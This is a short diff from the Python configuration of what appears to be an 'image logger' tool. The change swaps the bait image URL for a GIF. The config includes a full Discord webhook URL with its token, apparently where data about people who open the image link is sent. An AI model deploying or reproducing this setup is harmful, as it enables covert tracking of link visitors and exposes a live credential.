@@ -13,7 +13,7 @@ __author__ = "anmajiro"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1474881447432290304/Wdqbf2dbTxKfISZrr9lYNDPyCAZAYWDmVKoSTzOh8GJ_w6i1BkVtQv6JfC7ThAViok6d",
-    "image": "https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExaHgwMmtpaGpoODlmMWVmN215MG55bGtlbGhvaWpvcmw2NnhtYm0xOCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/HT242oEcxM07Qn7A58/giphy.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
